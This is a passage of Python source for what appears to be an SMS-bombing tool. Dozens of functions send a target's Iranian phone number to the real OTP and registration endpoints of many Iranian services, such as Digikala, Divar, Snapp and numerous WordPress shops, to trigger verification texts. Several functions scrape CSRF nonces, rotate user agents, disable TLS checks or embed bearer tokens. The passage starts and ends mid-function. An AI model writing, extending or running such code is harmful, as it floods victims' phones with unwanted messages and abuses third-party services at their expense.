        "Content-Type": "application/json",
        "Origin": "https://mobilex.ir",
        "Referer": "https://mobilex.ir/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(mobilex) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (mobilex) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] mobilex Exception: {e}{a}')
        return False


def alldigitall(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://api.alldigitall.ir/v1/auth/register?store_id=0"
    
    payload = {
        "firstname": "نام",
        "lastname": "خانوادگی", 
        "mobile": formatted_phone,
        "password": "12345678",
        "password_confirmation": "12345678"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://alldigitall.ir",
        "Referer": "https://alldigitall.ir/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(alldigitall) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (alldigitall) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] alldigitall Exception: {e}{a}')
        return False



def katonikhan(phone):
    import requests
    digits_phone = phone.replace("+98", "")
    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"
    try:
        url = "https://katonikhan.com/wp-admin/admin-ajax.php"
        payload = {
            "phone": formatted_phone,
            "digt_countrycode": "+98",
            "digits_process_register": "1",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "instance_id": "f2cf6e724788dcfaacd48173e7215663",
            "optional_data": "optional_data",
            "action": "digits_forms_ajax",
            "type": "register",
            "dig_otp": "otp",
            "digits": "1",
            "digits_redirect_page": "-1",
            "aio_special_field": "",
            "digits_form": "92e2d882a6",
            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://katonikhan.com",
            "Referer": "https://katonikhan.com/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F",
        }
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            try:
                response_data = response.json()
                if response_data.get("success") is True:
                    print(f'{g}(katonikhan) {a}Code Sent')
                    return True
            except:
                pass
        return False
    except Exception:
        return False

def katoonistore(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    
    try:
        session = requests.Session()
        home_response = session.get("https://katoonistore.ir/", timeout=10)
        
        instance_id = None
        instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
        match_obj = re.search(instance_pattern, home_response.text)
        if match_obj:
            instance_id = match_obj.group(1)
        if not instance_id:
            instance_id = "0ccd1ebf590232d8b06f9157a9654fa1"
        
        url = "https://katoonistore.ir/wp-admin/admin-ajax.php"
        payload = {
            "digits_reg_name": "م",
            "digt_countrycode": "+98",
            "phone": digits_phone,
            "digits_reg_تاریخ1747725841572": "",
            "jalali_digits_reg_تاریخ1747725841572463063470": "",
            "digits_process_register": "1",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "instance_id": instance_id,
            "optional_data": "optional_data",
            "action": "digits_forms_ajax",
            "type": "register",
            "dig_otp": "sms_otp",
            "digits": "1",
            "digits_redirect_page": "//katoonistore.ir/?page=1&redirect_to=https%3A%2F%2Fkatoonistore.ir%2F",
            "digits_form": "d3232db853",
            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatoonistore.ir%2F",
            "otp_resend": "true",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://katoonistore.ir",
            "Referer": "https://katoonistore.ir/",
        }
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get("success") is True:
                print(f'{g}(katoonistore) {a}Code Sent')
                return True
        
        print(f'{r}[-] (katoonistore) Failed{a}')
        return False
    except Exception:
        print(f'{r}[-] (katoonistore) Failed{a}')
        return False

def hajamooo(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    formatted_phone = f"{digits_phone[:3]} {digits_phone[3:6]} {digits_phone[6:]}"
    
    try:
        session = requests.Session()
        home_response = session.get("https://hajamooo.ir/", timeout=10)
        
        nounce_value = None
        nounce_patterns = [
            r'name="dig_nounce" value="([a-f0-9]+)"',
            r'name="csrf" value="([a-f0-9]+)"',
            r'var nonce = "([a-f0-9]+)"',
        ]
        for pattern in nounce_patterns:
            match_obj = re.search(pattern, home_response.text)
            if match_obj:
                nounce_value = match_obj.group(1)
                break
        if not nounce_value:
            nounce_value = "34bcba36e0"
        
        url = "https://hajamooo.ir/wp-admin/admin-ajax.php"
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": digits_phone,
            "csrf": nounce_value,
            "login": "1",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "digits": "1",
            "json": "1",
            "whatsapp": "0",
            "mobmail": formatted_phone,
            "dig_otp": "",
            "dig_nounce": nounce_value
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://hajamooo.ir",
            "Referer": "https://hajamooo.ir/",
        }
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            response_text = response.text.strip()
            if response_text == "1" or "success" in response_text.lower():
                print(f'{g}(hajamooo) {a}Code Sent')
                return True
        
        print(f'{r}[-] (hajamooo) Failed{a}')
        return False
    except Exception:
        print(f'{r}[-] (hajamooo) Failed{a}')
        return False

def ilozi(phone):
    try:
        digits_phone = phone.replace("+98", "")
        session = requests.Session()
        
        # لیست User-Agent های مختلف
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
        ]
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://ilozi.com",
            "Referer": "https://ilozi.com/?login=true&page=2",
        }

        # دریافت صفحه اول
        home_response = session.get("https://ilozi.com/?login=true&page=2", 
                                   timeout=10, headers=headers)
        
        # استخراج مقادیر مورد نیاز
        instance_id = re.search(r'name="instance_id" value="([a-f0-9]+)"', home_response.text)
        digits_form = re.search(r'name="digits_form" value="([a-f0-9]+)"', home_response.text)

        # آماده سازی داده‌ها
        payload = {
            "login_digt_countrycode": "+98",
            "digits_phone": digits_phone,
            "action_type": "phone",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "digits": "1",
            "instance_id": instance_id.group(1) if instance_id else "6fb17492e0d343df4e533a9deb8ba6b9",
            "action": "digits_forms_ajax",
            "type": "login",
            "digits_redirect_page": "https://ilozi.com/my-account/?action=register",
            "digits_form": digits_form.group(1) if digits_form else "3780032f76",
            "_wp_http_referer": "/?login=true&page=2",
            "show_force_title": "1",
            "otp_resend": "true",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }

        # ارسال درخواست
        response = session.post("https://ilozi.com/wp-admin/admin-ajax.php", 
                               data=payload, headers=headers, timeout=10)

        # بررسی پاسخ
        if response.status_code == 200:
            if response.text.strip() == "1" or (response.json().get("success") if response.text else False):
                return True
        
        return False
            
    except Exception:
        return False



              
def achareh(phone):
    url = "https://api.achareh.co/v2/accounts/login/"
    payload = {"phone": "98" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Achareh) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Achareh) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Achareh Exception: {e}{a}')
        return False

def snappshop(phone):
    url = "https://apix.snappshop.co/auth/v1/pre-login"
    payload = {"mobile": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(SnappShop) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (SnappShop) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] SnappShop Exception: {e}{a}')
        return False

def bimebazar(phone):
    url = "https://bimebazar.com/accounts/api/login_sec/"
    payload = {"username": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Bimebazar) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Bimebazar) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Bimebazar Exception: {e}{a}')
        return False

def sibapp(phone):
    try:
        url = "https://api.sibapp.net/api/v1/user/register"
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json; charset=UTF-8",
            "cache-control": "no-cache",
            "user-agent": random.choice(user_agents),
        }
        
        payload = {
            "phone_number": formatted_phone
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10,
            verify=False
        )
        
        if response.status_code in [200, 201]:
            print(f'{g}(sibapp) sms sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] sibapp error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] sibapp exception: {e}{a}')
        return False


def komodaa(phone):
    try:
        url = "https://api.komodaa.com/api/v2.6/loginrc/request"
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "web-user-agent": "komodaa/7.0.1.301 Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
            "install-ref": "WEB",
            "k-session-id": f"{uuid.uuid4().hex}-{uuid.uuid4().hex[:12]}",
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1"
        }
        
        payload = {
            "phone_number": formatted_phone
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10,
            verify=False
        )
        
        if response.status_code in [200, 201]:
            print(f'{g}(komodaa) SMS sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] komodaa error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] komodaa exception: {e}{a}')
        return False

 
def alopeyk_safir(phone):
    url = "https://api.alopeyk.com/safir-service/api/v1/login"
    payload = {"phone": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Alopeyk Safir) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Alopeyk Safir) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Alopeyk Safir Exception: {e}{a}')
        return False

def snap(phone):
    snapH = {"Host": "app.snapp.taxi", "content-type": "application/json"}
    snapD = {"cellphone": phone}
    try:
        snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
        return "OK" in snapR
    except Exception as e:
        print(f"{r}[!] Snap Exception: {e}")
        return False
def shahrfarsh(phone):
    url = "https://shahrfarsh.com/Account/Login"
    payload = {"phoneNumber": "0" + phone.split("+98")[1]}
    try:
        response = post(url, data=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(ShahrFarsh) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (ShahrFarsh) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] ShahrFarsh Exception: {e}{a}')
        return False
def tetherland(phone):
    url = "https://service.tetherland.com/api/v5/login-register"
    payload = {"mobile": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Tetherland) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Tetherland) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Tetherland Exception: {e}{a}')
        return False


def pindo(phone):
    pindo_url = "https://api.pindo.ir/v1/user/login-register/"
    pindo_payload = {"phone": "0"+phone.split("+98")[1]}
    try:
        pindo_response = post(timeout=5, url=pindo_url, json=pindo_payload).text
        if "success" in pindo_response.lower():  # یا شرط مناسب با پاسخ API
            print(f'{g}(Pindo) {a}Code Sent')
            return True
    except Exception as e:
        print(f'[!] Pindo Exception: {e}')
        return False

def drnext(phone):
    phoneNumber_zero = "0" + phone.split("+98")[1]  # تبدیل +98 به 0 اول
    url = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
    payload = {"source": "besina", "mobile": phoneNumber_zero}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(DrNext) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (DrNext) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] (DrNext) Exception: {e}{a}')

def gap(phone):
    try:
        gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1])).text
        return "OK" in gapR
    except Exception as e:
        print(f"{r}[!] Gap Exception: {e}")
        return False

def divar(phone):
    divarD = {"phone": phone.split("+98")[1]}
    try:
        divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", json=divarD).json()
        return divarR.get("authenticate_response") == "AUTHENTICATION_VERIFICATION_CODE_SENT"
    except Exception as e:
        print(f"{r}[!] Divar Exception: {e}")
        return False

def alibaba(phone):
    alibabaD = {"phoneNumber": "0"+phone.split("+98")[1]}
    try:
        alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', json=alibabaD ).json()
        return alibabaR.get("result", {}).get("success")
    except Exception as e:
        print(f"{r}[!] AliBaba Exception: {e}")
        return False

def mek(phone):
    try:
        # فرمت شماره
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"

        # URL و payload
        url = "https://www.hamrah-mechanic.com/api/v1/membership/otp"
        payload = {
            "PhoneNumber": formatted_phone,
            "prevDomainUrl": None,
            "landingPageUrl": "https://www.hamrah-mechanic.com/carprice/saipa/zamyadpickup/type-2543/",
            "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
            "prevUrl": "https://www.hamrah-mechanic.com/profile/",
            "referrer": None
        }

        # هدرها
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "env": "prd",
            "Source": "ios",
            "X-Meta-Token": "413341",
            "_uti": str(uuid.uuid4())
        }

        # درخواست POST
        r = requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
        print(r.status_code, r.text)  # debug
        if r.status_code == 200:
            return True
        else:
            return False

    except Exception as e:
        print(f'{r}[!] HamrahMechanic Exception: {e}{a}')
        return False



def okorosh(phone):
    okJ = {
        "mobile": "0"+phone.split("+98")[1],
        "g-recaptcha-response": "dummy"
    }
    okU = 'https://my.okcs.com/api/check-mobile'
    okH = {'accept': 'application/json, text/plain, */*','content-type': 'application/json;charset=UTF-8'}
    try:
        okR = post(timeout=5, url=okU, headers=okH, json=okJ).text
        return 'success' in okR
    except Exception as e:
        print(f"{r}[!] OfoghKourosh Exception: {e}")
        return False

def snapp_market(phone):
    url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass"
    params = {"cellphone": "0" + phone.split("+98")[1]}
    try:
        response = post(url, params=params, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Snapp Market) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Snapp Market) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Snapp Market Exception: {e}{a}')
        return False

def digikala(phone):
    url = "https://api.digikala.com/v1/user/authenticate/"
    payload = {"username": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Digikala) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Digikala) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Digikala Exception: {e}{a}')
        return False


def mrbilit(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = f"https://auth.mrbilit.ir/api/Token/send?mobile={formatted_phone}"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Authorization": "Bearer eyJhbGciOiJIUzl1NilsInR5cCl6lkpXVCJ9.eyJidXMiOilOZilsInRybil6ljE3liwic3JjljoiMiJ9.vvpr9fgASvk7B714KQKCz-SaCmoErab_p3cslvULG1W",
        "X-PlayerID": "dfb64872-1076-49c9-a2e1-a2a68eb80bf4",
        "Sessionld": "session_adffeb7f-1d11-45fc-b0f7-2209fa54f1ba",
        "Origin": "https://www.mrbilit.ir",
        "Referer": "https://www.mrbilit.ir/",
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(mrbilit) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (mrbilit) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] mrbilit Exception: {e}{a}')
        return False


def ghasedak24(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://ghasedak24.com/user/otp"
    
    # معمولاً اینگونه سایت‌ها از POST با پارامتر mobile استفاده می‌کنند
    payload = {
        "mobile": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://ghasedak24.com",
        "Referer": "https://ghasedak24.com/",
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            print(f'{g}(ghasedak24) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (ghasedak24) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] ghasedak24 Exception: {e}{a}')
        return False


def trip(phone):
    try:
        url = "https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email"
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "user-agent": random.choice(user_agents),
        }
        
        payload = {
            "phoneNumber": formatted_phone,
            "token": "VHJpcDUzODc1NDUxNzAxNzU2Mzk3MTU3MTYy"  # توکن ثابت
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10,
            verify=False
        )
        
        print(f'{y}[Debug] trip Status: {response.status_code}{a}')
        print(f'{y}[Debug] trip Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(trip) sms sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] trip error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] trip exception: {e}{a}')
        return False


def mo7_ir(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://mo7.ir/bakala/ajax/send_code/"
    
    payload = {
        "action": "bakala_send_code",
        "phone_email": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-CSRF-TOKEN": "b5ea5c0516",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://mo7.ir",
        "Referer": "https://mo7.ir/",
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(mo7_ir) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (mo7_ir) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] mo7_ir Exception: {e}{a}')
        return False
        

def dgshahr(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://lend-b.dgshahr.com/user/login/"
    
    payload = {
        "phone_number": formatted_phone,
        "source": "google-organic",
        "campaign": "undefined"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://lend-b.dgshahr.com",
        "Referer": "https://lend-b.dgshahr.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(dgshahr) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (dgshahr) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] dgshahr Exception: {e}{a}')
        return False



def torobpay(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://api.torobpay.com/user/v1/login/?source=mobile&http_referrer=https%3A%2F%2Fwww.google.com%2F"
    
    payload = {
        "phone_number": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-CSRFTOKEN": "",
        "Origin": "https://torobpay.com",
        "Referer": "https://torobpay.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(torobpay) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (torobpay) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] torobpay Exception: {e}{a}')
        return False

def malltina(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://api.malltina.com/profiles"
    
    payload = {
        "password": "mM12345678",
        "mobile": formatted_phone,
        "sign_up_referral_link": "https://www.google.com/"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.malltina.com",
        "Referer": "https://www.malltina.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(malltina) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (malltina) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] malltina Exception: {e}{a}')
        return False


def missomister(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    
    try:
        session = requests.Session()
        home_response = session.get("https://www.missomister.com/", timeout=10)
        
        # استخراج CSRF_TOKEN
        csrf_token = None
        csrf_patterns = [
            r'name="csrf" value="([a-f0-9]+)"',
            r'name="dig_nounce" value="([a-f0-9]+)"'
        ]
        
        for pattern in csrf_patterns:
            match = re.search(pattern, home_response.text)
            if match:
                csrf_token = match.group(1)
                break
        
        if not csrf_token:
            csrf_token = "7bc87785e8"
        
        url = "https://www.missomister.com/wp-admin/admin-ajax.php"
        
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": digits_phone,
            "csrf": csrf_token,
            "login": "2",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "json": "1",
            "whatsapp": "0"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.missomister.com",
            "Referer": "https://www.missomister.com/",
        }
        
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            if response.text.strip() == "1":
                print(f'{g}(missomister) {a}Code Sent')
                return True
        
        print(f'{r}[-] (missomister) Failed{a}')
        return False
            
    except Exception:
        print(f'{r}[-] (missomister) Failed{a}')
        return False


def candom_shop(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://candom.shop/bakala/ajax/send_code/"
    
    payload = {
        "action": "bakala_send_code",
        "phone_email": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-CSRF-TOKEN": "7aae5b22e1",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://candom.shop",
        "Referer": "https://candom.shop/",
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            print(f'{g}(candom_shop) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (candom_shop) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] candom_shop Exception: {e}{a}')
        return False
        

def tapsi_food(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://api.tapsi.food/v1/api/Authentication/otp"
    
    payload = {
        "cellPhone": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJHdWVzdElkIjoiZTc4ZjIwMzgtZjgzNi00MDA2LThjYzItYTYzY2YzMmI2OWY5IiwiVHlwZSI6Ikd1ZXN0IiwiRXhwaXJlSW4iOiIxMDgwMDAwMCIsIm5iZiI6MTc1NjI0Mzc1OCwiZXhwIjoxNzU2MjU0NTU4LCJpYXQiOjE3NTYyNDM3NTgsImlzcyI6Imh0dHBzOi8vbG9jYWxob3N0OjUwMDEiLCJhdWQiOiJodHRwczovL2xvY2FsaG9zdDo1MDAxIn0.FJnYvqwBa9za2y0SGANgFg_3PGNLeZkeCDPebJS0YTE",
        "x-platform": "mobile",
        "x-app-version": "v1.5.12-prd",
        "Origin": "https://tapsi.food",
        "Referer": "https://tapsi.food/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            print(f'{g}(tapsi_food) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (tapsi_food) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] tapsi_food Exception: {e}{a}')
        return False


def banimode(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://mobapi.banimode.com/api/v2/auth/request"
    
    payload = {
        "phone": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=utf-8",
        "Origin": "https://www.banimode.com",
        "Referer": "https://www.banimode.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
